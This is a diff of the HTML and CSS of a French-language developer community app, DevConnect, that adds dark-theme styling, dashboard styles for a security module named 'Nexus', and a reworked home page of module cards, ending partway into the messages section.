@@ -461,6 +461,8 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 .form-input{width:100%;padding:11px 14px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-family:var(--font-body);font-size:14px;outline:none;transition:all .25s;}
 .form-input:focus{border-color:rgba(0,255,163,.4);background:rgba(0,255,163,.04);box-shadow:0 0 0 3px rgba(0,255,163,.07);}
 .form-input-mono{font-family:var(--font-mono);}
+/* Fix select native dropdown illisible en thème sombre */
+select.form-input{color-scheme:dark;background-color:#111;}
 .form-error{color:#f87171;font-size:12px;margin-top:8px;padding:8px 12px;background:rgba(248,113,113,.07);border:1px solid rgba(248,113,113,.15);border-radius:var(--radius);display:none;}
 .form-error.show{display:block;}
 .form-hint{font-size:11px;color:var(--text-muted);margin-top:5px;}
@@ -912,6 +914,14 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 .admin-form-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.1),transparent);}
 .admin-form-title{font-size:14px;font-weight:600;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
 .admin-form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+
+/* ── ROLE PILLS ── */
+.role-pill{display:inline-flex;align-items:center;padding:5px 12px;border-radius:100px;font-size:12px;font-family:var(--font-mono);cursor:pointer;transition:all .15s;border:1px solid rgba(255,255,255,.09);color:rgba(255,255,255,.45);background:rgba(255,255,255,.03);user-select:none;}
+.role-pill:hover{border-color:rgba(255,255,255,.2);color:rgba(255,255,255,.75);background:rgba(255,255,255,.06);}
+.role-pill.selected{border-color:var(--rpill-c,rgba(255,255,255,.5));color:var(--rpill-c,var(--text));background:rgba(var(--rpill-c,255,255,255),.08);box-shadow:0 0 0 1px var(--rpill-c,rgba(255,255,255,.3)) inset;font-weight:600;}
+.admin-page-header{margin-bottom:24px;}
+.admin-page-title{font-family:var(--font-display);font-size:20px;font-weight:700;margin-bottom:4px;}
+.admin-page-sub{font-size:13px;color:var(--text-muted);}
 .live-dot{width:7px;height:7px;border-radius:50%;background:#6ab87a;display:inline-block;animation:livePulse 2s ease-in-out infinite;box-shadow:0 0 8px rgba(106,184,122,.6);}
 .admin-table{background:var(--bg1);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden;}
 .status-badge{padding:2px 9px 2px 7px;border-radius:100px;font-size:10px;font-family:var(--font-mono);border:1px solid;display:inline-flex;align-items:center;gap:5px;}
@@ -1186,6 +1196,209 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 .nexus-setting-sub{font-size:11px;color:rgba(255,255,255,.3);font-family:var(--font-mono);margin-top:2px;}
 .nexus-tag{display:inline-flex;align-items:center;padding:1px 8px;border-radius:100px;font-size:10px;font-family:var(--font-mono);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);color:rgba(255,255,255,.5);}
 
+/* ===== NEXUS CYBER DEFENSE — EXTENSIONS ===== */
+/* Threat Intel */
+.nexus-threat-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px;}
+.nexus-threat-card{background:rgba(10,10,10,.95);border:1px solid rgba(255,255,255,.06);border-radius:var(--radius-lg);padding:16px 18px;position:relative;overflow:hidden;}
+.nexus-threat-card.danger{border-color:rgba(200,60,60,.25);background:rgba(16,6,6,.95);}
+.nexus-threat-card.warn{border-color:rgba(200,160,60,.2);background:rgba(12,10,4,.95);}
+.nexus-threat-title{font-size:11px;font-family:var(--font-mono);color:rgba(255,255,255,.3);text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px;}
+/* User Risk Score */
+.nexus-risk-row{display:flex;align-items:center;gap:10px;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.04);}
+.nexus-risk-row:last-child{border-bottom:none;}
+.nexus-risk-bar-wrap{flex:1;height:4px;background:rgba(255,255,255,.06);border-radius:2px;overflow:hidden;}
+.nexus-risk-bar{height:100%;border-radius:2px;transition:width .5s ease;}
+.nexus-risk-bar.low{background:#4a8a5a;}
+.nexus-risk-bar.mid{background:#9a8a3a;}
+.nexus-risk-bar.high{background:#9a4a4a;}
+.nexus-risk-bar.critical{background:#cc3333;}
+.nexus-risk-score{font-family:var(--font-mono);font-size:11px;width:28px;text-align:right;flex-shrink:0;}
+.nexus-risk-user{font-size:12px;width:110px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex-shrink:0;}
+/* Incidents */
+.nexus-incident{background:rgba(12,12,12,.9);border:1px solid rgba(255,255,255,.06);border-radius:var(--radius-lg);padding:14px 18px;margin-bottom:10px;display:flex;align-items:flex-start;gap:14px;transition:border-color .2s;}
+.nexus-incident.open{border-left:3px solid #9a4a4a;}
+.nexus-incident.investigating{border-left:3px solid #9a8a3a;}
+.nexus-incident.resolved{border-left:3px solid #4a8a5a;opacity:.55;}
+.nexus-incident-badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:100px;font-size:10px;font-family:var(--font-mono);font-weight:600;flex-shrink:0;margin-top:2px;}
+.nexus-incident-badge.open{background:rgba(180,50,50,.15);color:#e07070;border:1px solid rgba(180,50,50,.3);}
+.nexus-incident-badge.investigating{background:rgba(180,160,50,.12);color:#d0c060;border:1px solid rgba(180,160,50,.25);}
+.nexus-incident-badge.resolved{background:rgba(50,160,80,.1);color:#70c080;border:1px solid rgba(50,160,80,.2);}
+.nexus-incident-title{font-size:13px;font-weight:500;margin-bottom:3px;}
+.nexus-incident-meta{font-size:11px;color:rgba(255,255,255,.3);font-family:var(--font-mono);}
+.nexus-incident-actions{margin-left:auto;display:flex;gap:6px;flex-shrink:0;}
+/* Attack Live Feed */
+.nexus-attack-feed{display:flex;flex-direction:column;gap:0;max-height:340px;overflow-y:auto;}
+.nexus-attack-item{display:flex;align-items:center;gap:10px;padding:8px 18px;border-bottom:1px solid rgba(255,255,255,.03);animation:nexusAttackIn .35s ease;}
+.nexus-attack-item:last-child{border-bottom:none;}
+@keyframes nexusAttackIn{from{background:rgba(200,60,60,.08);transform:translateX(-4px);}to{background:transparent;transform:translateX(0);}}
+.nexus-attack-type{font-size:10px;font-family:var(--font-mono);color:rgba(255,255,255,.3);width:90px;flex-shrink:0;}
+.nexus-attack-detail{flex:1;font-size:12px;color:rgba(255,255,255,.7);}
+.nexus-attack-time{font-size:10px;font-family:var(--font-mono);color:rgba(255,255,255,.2);flex-shrink:0;}
+/* Brute Force Indicator */
+.nexus-bf-meter{display:flex;align-items:center;gap:8px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.04);}
+.nexus-bf-meter:last-child{border-bottom:none;}
+.nexus-bf-ip{font-family:var(--font-mono);font-size:11px;color:rgba(255,255,255,.5);width:120px;flex-shrink:0;}
+.nexus-bf-count{font-family:var(--font-mono);font-size:12px;font-weight:700;width:28px;flex-shrink:0;}
+.nexus-bf-bar-wrap{flex:1;height:6px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden;}
+.nexus-bf-bar{height:100%;border-radius:3px;transition:width .4s ease;}
+/* Anomaly */
+.nexus-anomaly-item{display:flex;align-items:center;gap:12px;padding:10px 18px;border-bottom:1px solid rgba(255,255,255,.04);}
+.nexus-anomaly-item:last-child{border-bottom:none;}
+.nexus-anomaly-label{flex:1;font-size:12px;}
+.nexus-anomaly-score{font-family:var(--font-mono);font-size:14px;font-weight:700;}
+.nexus-anomaly-score.low{color:#4a8a5a;}
+.nexus-anomaly-score.mid{color:#9a8a3a;}
+.nexus-anomaly-score.high{color:#cc4444;}
+/* Test panel */
+.nexus-test-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;padding:16px 0;}
+.nexus-test-btn{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:var(--radius);padding:12px 14px;cursor:pointer;font-size:12px;font-family:var(--font-mono);color:rgba(255,255,255,.6);text-align:left;transition:all .15s;line-height:1.5;}
+.nexus-test-btn:hover{background:rgba(255,255,255,.07);border-color:rgba(255,255,255,.14);color:var(--text);}
+.nexus-test-btn .nexus-test-label{font-weight:600;margin-bottom:2px;display:block;}
+.nexus-test-btn .nexus-test-desc{font-size:10px;color:rgba(255,255,255,.3);display:block;}
+.nexus-test-log{background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.06);border-radius:var(--radius);padding:12px 14px;font-family:var(--font-mono);font-size:11px;color:rgba(255,255,255,.5);max-height:140px;overflow-y:auto;line-height:1.8;margin-top:12px;}
+.nexus-test-log .ok{color:#6ab87a;}
+.nexus-test-log .err{color:#e08080;}
+.nexus-test-log .info{color:#80a8e0;}
+/* IP badge */
+.nexus-ip{display:inline-flex;align-items:center;gap:4px;padding:1px 7px;border-radius:4px;font-size:10px;font-family:var(--font-mono);background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);color:rgba(255,255,255,.4);}
+/* Pulse animation pour attaque en cours */
+@keyframes nexusPulse{0%,100%{opacity:1;}50%{opacity:.4;}}
+.nexus-live-pulse{animation:nexusPulse 1.4s ease-in-out infinite;}
+
+/* ===== APP SHELL — TOPNAV (manquant) ===== */
+.topnav{display:flex;align-items:center;gap:24px;padding:13px 28px;border-bottom:1px solid var(--border);background:rgba(8,8,8,.72);backdrop-filter:blur(14px);position:sticky;top:0;z-index:60;}
+.topnav-logo{display:flex;align-items:center;gap:9px;font-family:var(--font-display);font-weight:700;font-size:16px;color:var(--text);text-decoration:none;flex-shrink:0;}
+.nav-items{display:flex;align-items:center;gap:2px;flex:1;overflow-x:auto;scrollbar-width:none;}
+.nav-items::-webkit-scrollbar{display:none;}
+.nav-item{display:flex;align-items:center;gap:6px;padding:8px 12px;border-radius:var(--radius);font-size:13px;color:var(--text-secondary);text-decoration:none;cursor:pointer;white-space:nowrap;transition:all .2s;}
+.nav-item:hover{background:rgba(255,255,255,.05);color:var(--text);}
+.nav-item.active{background:rgba(255,255,255,.08);color:var(--text);}
+.nav-item-icon{font-size:12px;opacity:.85;}
+.topnav-right{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+.topnav-search{display:flex;align-items:center;gap:8px;padding:7px 12px;border-radius:var(--radius);background:var(--bg1);border:1px solid var(--border);cursor:pointer;color:var(--text-muted);transition:border-color .2s;}
+.topnav-search:hover{border-color:var(--border-light);}
+.search-kbd{padding:1px 6px;border-radius:4px;border:1px solid var(--border-light);font-family:var(--font-mono);font-size:10px;color:var(--text-muted);}
+.notif-btn{position:relative;background:none;border:none;font-size:16px;cursor:pointer;color:var(--text-secondary);padding:5px;line-height:1;}
+.notif-badge{position:absolute;top:-1px;right:-1px;width:8px;height:8px;border-radius:50%;background:#f43f5e;border:2px solid var(--bg0);}
+
+/* ===== APP SHELL — SECTIONS (manquant) ===== */
+.app-body{position:relative;z-index:1;min-height:calc(100vh - 60px);}
+.app-section{display:none;padding:32px 24px 80px;max-width:1280px;margin:0 auto;animation:appSectionIn .35s var(--ease);}
+.app-section.active{display:block;}
+@keyframes appSectionIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+
+/* ===== ACCUEIL / FIL D'ACTUALITÉ (manquant) ===== */
+.home-layout{display:grid;grid-template-columns:1fr 320px;gap:24px;align-items:start;}
+.home-greeting{display:flex;align-items:center;gap:14px;padding:18px 20px;background:var(--bg1);border:1px solid var(--border);border-radius:var(--radius-lg);margin-bottom:24px;}
+.home-greeting-text{flex:1;min-width:0;}
+.home-greeting-title{font-family:var(--font-display);font-size:17px;font-weight:700;margin-bottom:2px;}
+.home-greeting-sub{font-size:13px;color:var(--text-secondary);}
+.home-greeting-stats{display:flex;gap:18px;flex-shrink:0;}
+.hgs-item{text-align:center;}
+.hgs-num{font-family:var(--font-display);font-size:18px;font-weight:700;color:var(--aurora-green);}
+.hgs-label{font-size:9px;color:var(--text-muted);font-family:var(--font-mono);text-transform:uppercase;letter-spacing:.04em;}
+.feed-title{font-family:var(--font-display);font-size:16px;font-weight:700;}
+
+.composer{background:var(--bg1);border:1px solid var(--border);border-radius:var(--radius-lg);padding:16px;margin-bottom:20px;}
+.composer-row{display:flex;gap:12px;}
+.composer-avatar{width:38px;height:38px;border-radius:50%;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:12px;color:var(--text-secondary);flex-shrink:0;overflow:hidden;}
+.composer-avatar img{width:100%;height:100%;object-fit:cover;border-radius:50%;}
+.composer-input{flex:1;background:transparent;border:none;outline:none;color:var(--text);font-family:var(--font-body);font-size:14px;resize:none;min-height:44px;line-height:1.5;}
+.composer-input::placeholder{color:var(--text-muted);}
+.composer-actions{display:flex;align-items:center;justify-content:space-between;margin-top:10px;padding-top:10px;border-top:1px solid var(--border);}
+.composer-tools{display:flex;gap:6px;}
+.composer-tool{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:5px 10px;font-size:12px;color:var(--text-secondary);cursor:pointer;font-family:var(--font-mono);transition:all .2s;}
+.composer-tool:hover{color:var(--text);border-color:var(--border-light);}
+
+.empty-state{text-align:center;padding:48px 20px;color:var(--text-muted);}
+.empty-state-icon{font-size:28px;margin-bottom:10px;opacity:.5;}
+.empty-state-text{font-size:13px;}
+.empty-state-sub{font-size:12px;color:var(--text-muted);margin-top:4px;}
+
+.post-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px;margin-bottom:14px;}
+.post-header{display:flex;align-items:flex-start;gap:12px;margin-bottom:12px;}
+.post-avatar{width:38px;height:38px;border-radius:50%;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:13px;color:var(--text-secondary);flex-shrink:0;overflow:hidden;}
+.post-avatar img{width:100%;height:100%;object-fit:cover;border-radius:50%;}
+.post-meta{flex:1;min-width:0;}
+.post-name{font-weight:600;font-size:14px;}
+.post-role{font-size:11px;color:var(--text-muted);font-family:var(--font-mono);}
+.post-time{font-size:11px;color:var(--text-muted);font-family:var(--font-mono);flex-shrink:0;}
+.post-content{font-size:14px;line-height:1.6;color:var(--text);margin-bottom:12px;white-space:pre-wrap;word-break:break-word;}
+.post-content code{font-family:var(--font-mono);font-size:12px;background:var(--bg0);padding:2px 5px;border-radius:3px;color:var(--accent);border:1px solid var(--border);}
+.post-actions{display:flex;gap:6px;padding-top:10px;border-top:1px solid var(--border);}
+.post-action{background:transparent;border:none;color:var(--text-muted);font-size:12px;cursor:pointer;padding:6px 10px;border-radius:var(--radius);display:flex;align-items:center;gap:5px;transition:all .2s;}
+.post-action:hover{background:rgba(255,255,255,.05);color:var(--text-secondary);}
+.post-action.post-liked{color:var(--aurora-green);}
+.like-count{font-family:var(--font-mono);}
+
+/* ===== SIDEBAR WIDGETS (manquant) ===== */
+.sidebar-widget{background:var(--bg1);border:1px solid var(--border);border-radius:var(--radius-lg);padding:16px;margin-bottom:16px;}
+.widget-title{font-size:12px;font-weight:600;color:var(--text-secondary);margin-bottom:12px;font-family:var(--font-mono);text-transform:uppercase;letter-spacing:.04em;}
+
+/* ===== LEADERBOARD ITEM (manquant) ===== */
+.leaderboard-item{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--border);}
+.leaderboard-item:last-child{border-bottom:none;}
+.lb-rank{width:18px;font-family:var(--font-mono);font-size:12px;color:var(--text-muted);flex-shrink:0;text-align:center;}
+.lb-avatar{width:28px;height:28px;border-radius:50%;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:10px;font-family:var(--font-mono);color:var(--text-secondary);flex-shrink:0;overflow:hidden;}
+.lb-avatar img{width:100%;height:100%;object-fit:cover;border-radius:50%;}
+.lb-info{flex:1;min-width:0;}
+.lb-name{font-size:13px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.lb-specialty{font-size:10px;color:var(--text-muted);font-family:var(--font-mono);}
+.lb-xp{font-size:12px;font-family:var(--font-mono);color:var(--aurora-green);flex-shrink:0;}
+
+/* ===== ADMIN — en-têtes / grilles manquantes ===== */
+.admin-page-header{margin-bottom:20px;}
+.admin-page-title{font-family:var(--font-display);font-size:20px;font-weight:700;display:flex;align-items:center;gap:8px;}
+.admin-page-sub{font-size:13px;color:var(--text-muted);margin-top:4px;}
+.admin-sidebar-sep{height:1px;background:var(--border);margin:14px 16px;}
+.admin-stat-icon{font-size:18px;display:block;margin-bottom:10px;opacity:.85;}
+.admin-stat-num{font-family:var(--font-display);font-size:26px;font-weight:700;}
+.admin-stat-trend{font-size:11px;color:var(--text-muted);font-family:var(--font-mono);margin-top:4px;}
+.admin-stat-trend.up{color:var(--aurora-green);}
+.admin-stat-trend.down{color:#f43f5e;}
+.admin-activity-grid{display:grid;grid-template-columns:1.3fr 1fr;gap:14px;margin-top:16px;}
+.admin-bottom-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:16px;}
+.admin-bottom-num{font-family:var(--font-display);font-size:24px;font-weight:700;}
+@media (max-width:900px){.admin-activity-grid,.admin-bottom-grid{grid-template-columns:1fr;}}
+
+/* ===== DIVERS — petits bouts manquants ===== */
+.auth-sub{font-size:13px;color:var(--text-muted);margin-bottom:18px;}
+.badge-inline{display:inline-flex;align-items:center;padding:1px 6px;border-radius:100px;font-size:9px;font-family:var(--font-mono);background:rgba(255,255,255,.06);border:1px solid var(--border-light);color:var(--text-secondary);}
+.filter-chips{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px;}
+.profile-widgets{display:flex;flex-wrap:wrap;gap:6px;margin-top:12px;}
+.project-gh-stats{display:flex;gap:10px;}
+.snippet-comments{margin-top:10px;}
+
+@media (max-width:1000px){
+  .home-layout{grid-template-columns:1fr;}
+  .nav-items{display:none;}
+}
+
+/* ===== MODULE SUB-NAV (en-tête contextuel dans une page de module) ===== */
+.module-subnav{display:flex;align-items:center;gap:18px;margin-bottom:24px;padding-bottom:16px;border-bottom:1px solid var(--border);flex-wrap:wrap;}
+.module-subnav-back{font-size:12px;color:var(--text-muted);cursor:pointer;font-family:var(--font-mono);transition:color .2s;flex-shrink:0;}
+.module-subnav-back:hover{color:var(--text);}
+.module-subnav-title{font-family:var(--font-display);font-size:17px;font-weight:700;flex-shrink:0;}
+.module-subnav-tabs{display:flex;gap:6px;margin-left:auto;}
+.module-subnav-tab{padding:6px 14px;border-radius:100px;font-size:13px;color:var(--text-secondary);cursor:pointer;border:1px solid var(--border);transition:all .2s;}
+.module-subnav-tab:hover{color:var(--text);border-color:var(--border-light);}
+.module-subnav-tab.active{background:var(--text);color:var(--bg0);border-color:var(--text);font-weight:600;}
+@media (max-width:700px){.module-subnav-tabs{margin-left:0;width:100%;}}
+
+/* ===== CUSTOM DROPDOWN (remplace les <select> natifs illisibles en thème sombre) ===== */
+.cdrop{position:relative;width:100%;}
+.cdrop-trigger{width:100%;padding:11px 14px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-family:var(--font-body);font-size:14px;display:flex;align-items:center;justify-content:space-between;gap:8px;cursor:pointer;transition:all .25s;user-select:none;}
+.cdrop-trigger:hover{border-color:var(--border-light);}
+.cdrop.open .cdrop-trigger,.cdrop-trigger:focus{border-color:rgba(0,255,163,.4);background:rgba(0,255,163,.04);box-shadow:0 0 0 3px rgba(0,255,163,.07);}
+.cdrop-trigger-label{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.cdrop-trigger-arrow{flex-shrink:0;width:9px;height:9px;border-right:1.5px solid var(--text-muted);border-bottom:1.5px solid var(--text-muted);transform:rotate(45deg);transition:transform .2s;margin-top:-3px;}
+.cdrop.open .cdrop-trigger-arrow{transform:rotate(-135deg);margin-top:3px;}
+.cdrop-menu{position:absolute;top:calc(100% + 6px);left:0;right:0;background:#111318;border:1px solid var(--border-light);border-radius:var(--radius);box-shadow:0 16px 40px -12px rgba(0,0,0,.7);padding:5px;z-index:200;max-height:260px;overflow-y:auto;display:none;}
+.cdrop.open .cdrop-menu{display:block;}
+.cdrop-option{padding:9px 11px;border-radius:6px;font-size:13px;color:var(--text-secondary);cursor:pointer;transition:background .15s,color .15s;}
+.cdrop-option:hover{background:rgba(255,255,255,.06);color:var(--text);}
+.cdrop-option.selected{background:rgba(0,255,163,.1);color:var(--aurora-green);}
+.cdrop.mono .cdrop-trigger,.cdrop.mono .cdrop-option{font-family:var(--font-mono);font-size:12px;}
 </style>
 </head>
 <body>
@@ -1682,13 +1895,6 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
     <a href="#" class="topnav-logo" onclick="navigate('home');return false"><div class="logo-mark"><svg width="34" height="34" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="hBgfoot" x1="30" y1="30" x2="130" y2="160" gradientUnits="userSpaceOnUse"><stop offset="0%" stop-color="#FFD060"/><stop offset="28%" stop-color="#FF9060"/><stop offset="58%" stop-color="#E060C0"/><stop offset="100%" stop-color="#6090FF"/></linearGradient><linearGradient id="hShfoot" x1="30" y1="160" x2="130" y2="30" gradientUnits="userSpaceOnUse"><stop offset="0%" stop-color="#80C8FF" stop-opacity=".45"/><stop offset="55%" stop-color="#C080FF" stop-opacity=".28"/><stop offset="100%" stop-color="#FFD080" stop-opacity=".35"/></linearGradient></defs><rect width="200" height="200" rx="44" fill="#090909"/><g transform="translate(112,52) rotate(8)"><rect width="62" height="100" rx="10" fill="#2E2418" opacity=".9"/></g><g transform="translate(86,44) rotate(4)"><rect width="62" height="100" rx="10" fill="#6B5C38" opacity=".92"/><rect width="62" height="100" rx="10" fill="none" stroke="#8A7448" stroke-width="0.8" opacity=".5"/></g><g transform="translate(48,38) rotate(-4)"><rect width="74" height="116" rx="12" fill="url(#hBgfoot)"/><rect width="74" height="116" rx="12" fill="url(#hShfoot)"/><rect x="8" y="8" width="58" height="28" rx="6" fill="white" opacity=".13"/><rect x="8" y="90" width="38" height="4" rx="2" fill="white" opacity=".22"/><rect x="8" y="100" width="26" height="4" rx="2" fill="white" opacity=".16"/></g></svg></div>DevConnect</a>
     <div class="nav-items">
       <a class="nav-item active" onclick="navigate('home')" data-section="home"><span class="nav-item-icon">⌂</span>Accueil</a>
-      <a class="nav-item" onclick="navigate('messages')" data-section="messages"><span class="nav-item-icon">◉</span>Messages</a>
-      <a class="nav-item" onclick="navigate('discover')" data-section="discover"><span class="nav-item-icon">◈</span>Découverte</a>
-      <a class="nav-item" onclick="navigate('learn')" data-section="learn"><span class="nav-item-icon">◆</span>Apprendre</a>
-      <a class="nav-item" onclick="navigate('ranking')" data-section="ranking"><span class="nav-item-icon">◇</span>Classement</a>
-      <a class="nav-item" onclick="navigate('recruit')" data-section="recruit"><span class="nav-item-icon">⬡</span>Recrutement</a>
-      <a class="nav-item" onclick="navigate('editor')" data-section="editor"><span class="nav-item-icon">⬢</span>Éditeur</a>
-      <a class="nav-item" onclick="navigate('snippets')" data-section="snippets"><span class="nav-item-icon">❖</span>Snippets</a>
       <a class="nav-item" id="nav-admin" onclick="navigate('admin')" data-section="admin" style="display:none"><span class="nav-item-icon">⬟</span>Admin</a>
       <a class="nav-item" id="nav-nexus" onclick="navigate('nexus')" data-section="nexus" style="display:none"><span class="nav-item-icon">◈</span>Nexus</a>
     </div>
@@ -1717,17 +1923,104 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 
     <!-- ACCUEIL -->
     <div class="app-section active" id="section-home">
+      <div id="feed-banner-slot"></div>
+      <div class="home-greeting" id="home-greeting">
+        <div class="home-greeting-avatar" id="home-greeting-avatar">DC</div>
+        <div class="home-greeting-text">
+          <div class="home-greeting-title" id="home-greeting-title">Salut 👋</div>
+          <div class="home-greeting-sub">Choisis un module pour commencer.</div>
+        </div>
+        <div class="home-greeting-stats" id="home-greeting-stats"></div>
+      </div>
+      <div class="modules-grid">
+        <div class="module-card soon reveal-up" style="--mod-color:rgba(0,255,163,.5);--mod-color-dim:rgba(0,255,163,.2)" onclick="showToast('DevAI arrive bientôt comme extension indépendante 👀','info')">
+          <div class="module-top">
+            <div class="module-icon" style="background:rgba(0,255,163,.1)">🤖</div>
+            <div class="module-badge soon"><span class="dot"></span>Bientôt</div>
+          </div>
+          <div class="module-name">DevAI</div>
+          <div class="module-desc">Assistant IA spécialisé développeurs. Génère, debug, explique et optimise ton code en temps réel.</div>
+          <div class="module-meta">◇ Intégré à DevConnect — extension indépendante à venir</div>
+        </div>
+        <div class="module-card soon reveal-up" style="--mod-color:rgba(244,63,94,.5);--mod-color-dim:rgba(244,63,94,.2)" onclick="navigate('nexus')">
+          <div class="module-top">
+            <div class="module-icon" style="background:rgba(244,63,94,.1)">🛡️</div>
+            <div class="module-badge soon"><span class="dot"></span>Bientôt</div>
+          </div>
+          <div class="module-name">Nexus</div>
+          <div class="module-desc">Moteur de cybersécurité. Détecte XSS, SQL injection, CSRF et analyse les comportements suspects en temps réel.</div>
+          <div class="module-meta">◇ Intégré à DevConnect — extension indépendante à venir</div>
+        </div>
+        <div class="module-card reveal-up" style="--mod-color:rgba(79,124,255,.5);--mod-color-dim:rgba(79,124,255,.2)" onclick="navigate('recruit')">
+          <div class="module-top">
+            <div class="module-icon" style="background:rgba(79,124,255,.1)">🚀</div>
+            <div class="module-badge" style="border-color:rgba(79,124,255,.3);color:rgba(79,124,255,.9)"><span class="dot"></span>Disponible</div>
+          </div>
+          <div class="module-name">Deploy</div>
+          <div class="module-desc">Recrutement & missions. Trouve ta prochaine mission ou recrute un dev, paiements sécurisés par escrow.</div>
+          <div class="module-meta">◆ Actif sur DevConnect</div>
+        </div>
+        <div class="module-card reveal-up" style="--mod-color:rgba(245,158,11,.5);--mod-color-dim:rgba(245,158,11,.2)" onclick="navigate('ranking')">
+          <div class="module-top">
+            <div class="module-icon" style="background:rgba(245,158,11,.1)">📊</div>
+            <div class="module-badge" style="border-color:rgba(245,158,11,.3);color:rgba(245,158,11,.9)"><span class="dot"></span>Disponible</div>
+          </div>
+          <div class="module-name">Insight</div>
+          <div class="module-desc">Classement & analytics. Surveille tes performances, visualise tes données et optimise en continu.</div>
+          <div class="module-meta">◆ Actif sur DevConnect</div>
+        </div>
+        <div class="module-card reveal-up" style="--mod-color:rgba(139,92,246,.5);--mod-color-dim:rgba(139,92,246,.2)" onclick="navigate('feed')">
+          <div class="module-top">
+            <div class="module-icon" style="background:rgba(139,92,246,.1)">👥</div>
+            <div class="module-badge" style="border-color:rgba(139,92,246,.3);color:rgba(139,92,246,.9)"><span class="dot"></span>Disponible</div>
+          </div>
+          <div class="module-name">Teams</div>
+          <div class="module-desc">Collaboration en temps réel. Fil d'actualité, messagerie, DMs et découverte de la communauté.</div>
+          <div class="module-meta">◆ Actif sur DevConnect</div>
+        </div>
+        <div class="module-card reveal-up" style="--mod-color:rgba(0,212,255,.5);--mod-color-dim:rgba(0,212,255,.2)" onclick="navigate('editor')">
+          <div class="module-top">
+            <div class="module-icon" style="background:rgba(0,212,255,.1)">💻</div>
+            <div class="module-badge" style="border-color:rgba(0,212,255,.3);color:rgba(0,212,255,.9)"><span class="dot"></span>Disponible</div>
+          </div>
+          <div class="module-name">Code</div>
+          <div class="module-desc">Éditeur de code en ligne avec IA, coloration syntaxique, auto-save et partage de snippets.</div>
+          <div class="module-meta">◆ Actif sur DevConnect</div>
+        </div>
+        <div class="module-card reveal-up" style="--mod-color:rgba(16,185,129,.5);--mod-color-dim:rgba(16,185,129,.2)" onclick="navigate('learn')">
+          <div class="module-top">
+            <div class="module-icon" style="background:rgba(16,185,129,.1)">📚</div>
+            <div class="module-badge" style="border-color:rgba(16,185,129,.3);color:rgba(16,185,129,.9)"><span class="dot"></span>Disponible</div>
+          </div>
+          <div class="module-name">Docs</div>
+          <div class="module-desc">Génère et gère ta documentation automatiquement. Challenges, XP et progression par domaine.</div>
+          <div class="module-meta">◆ Actif sur DevConnect</div>
+        </div>
+        <div class="module-card soon reveal-up" style="--mod-color:rgba(232,121,249,.5);--mod-color-dim:rgba(232,121,249,.2)" onclick="showToast('Marketplace arrive une fois DevConnect commercialisé 👀','info')">
+          <div class="module-top">
+            <div class="module-icon" style="background:rgba(232,121,249,.1)">🛒</div>
+            <div class="module-badge soon"><span class="dot"></span>Bientôt</div>
+          </div>
+          <div class="module-name">Marketplace</div>
+          <div class="module-desc">Extensions, thèmes et outils créés par la communauté. Monétise tes créations ou découvre celles des autres.</div>
+          <div class="module-meta">◇ Pas encore commercialisé</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TEAMS — FIL D'ACTUALITÉ -->
+    <div class="app-section" id="section-feed">
+      <div class="module-subnav">
+        <span class="module-subnav-back" onclick="navigate('home')">← Modules</span>
+        <span class="module-subnav-title">Teams</span>
+        <div class="module-subnav-tabs">
+          <span class="module-subnav-tab" data-target="feed" onclick="navigate('feed')">Fil d'actualité</span>
+          <span class="module-subnav-tab" data-target="messages" onclick="navigate('messages')">Messages</span>
+          <span class="module-subnav-tab" data-target="discover" onclick="navigate('discover')">Découverte</span>
+        </div>
+      </div>
       <div class="home-layout">
         <div>
-          <div id="feed-banner-slot"></div>
-          <div class="home-greeting" id="home-greeting">
-            <div class="home-greeting-avatar" id="home-greeting-avatar">DC</div>
-            <div class="home-greeting-text">
-              <div class="home-greeting-title" id="home-greeting-title">Salut 👋</div>
-              <div class="home-greeting-sub">Quoi de neuf dans la communauté aujourd'hui ?</div>
-            </div>
-            <div class="home-greeting-stats" id="home-greeting-stats"></div>
-          </div>
           <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
             <div class="feed-title">Fil d'actualité</div>
             <button class="btn btn-ghost btn-sm">Récents</button>
@@ -1831,6 +2124,15 @@ a{color:inherit;}::selection{background:#333;color:#fff;}
 
     <!-- MESSAGES -->
     <div class="app-section" id="section-messages">
